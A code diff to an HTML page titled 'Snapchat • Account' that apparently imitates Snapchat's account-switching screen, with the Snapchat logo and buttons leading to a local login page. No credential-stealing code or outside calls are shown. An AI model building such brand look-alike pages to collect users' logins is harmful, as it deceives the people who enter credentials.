@@ -1,4 +1,5 @@
 <!-- it is first loader  page  -->
+
 <!DOCTYPE html>
 
 <html lang="en">
@@ -11,7 +12,7 @@
 
   <title>Snapchat • Account</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/accounts.css">
+ <link rel="stylesheet" href="/css/accounts.css">
 </head>
 <body>
   <!-- Loading Screen -->
@@ -27,7 +28,19 @@
     <img src="img/icon.svg" alt="Snapchat Logo">
   </div>
 
-  <!-- Removed the avatar, username, and remove account section -->
+  <div class="container">
+     <div class="avatar-container">
+       <div class="avatar">
+         <img src="" alt="User Avatar">
+       </div>
+     </div>
+ 
+     <div class="username"></div>
+     <a href="t">
+       <div class="remove-account"></div>
+     </a>
+   </div>
+
 
   <button class="login-btn" onclick="window.location.href='/login.html';">Log In</button>
 
@@ -36,6 +49,6 @@
     <div class="button" onclick="window.location.href='/login.html';">Switch Account</div>
   </div>
 
-  <script src="/js/account.js"></script>
+<script src="/js/account.js"></script>
 </body>
 </html>
